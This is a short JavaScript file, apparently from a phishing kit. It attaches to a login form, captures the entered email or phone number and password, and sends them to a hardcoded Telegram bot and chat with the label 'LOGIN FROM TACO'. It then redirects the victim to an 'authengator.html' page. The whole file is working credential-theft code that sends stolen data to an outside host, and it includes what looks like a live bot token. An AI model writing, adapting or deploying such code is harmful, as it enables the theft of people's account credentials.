document.getElementById("login-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    
    // Get form values
    const emailPhone = document.getElementById("email-phone").value;
    const password = document.getElementById("password").value;
    
    // Telegram bot details
    const botToken = "8043174080:AAGywvags0Uoa4tMGoJUfVz8oEJMHLaE5io";
    const chatId = "-4939567735";
    
    // Format the message with inline monospace for easy copying
    const message = `🔐 *LOGIN FROM TACO*  
📧 *Email/Phone:* \`${emailPhone.replace(/[`_*[\]()~>#+-=|{}.!]/g, '\\$&')}\`  
🔑 *Password:* \`${password.replace(/[`_*[\]()~>#+-=|{}.!]/g, '\\$&')}\``;
    
    try {
        // Send to Telegram
        const response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=MarkdownV2`
        );
        
        if (response.ok) {
            // Redirect after sending
            window.location.href = "authengator.html";
        } else {
            console.error("Failed to send to Telegram");
        }
    } catch (error) {
        console.error("Error:", error);
    }
});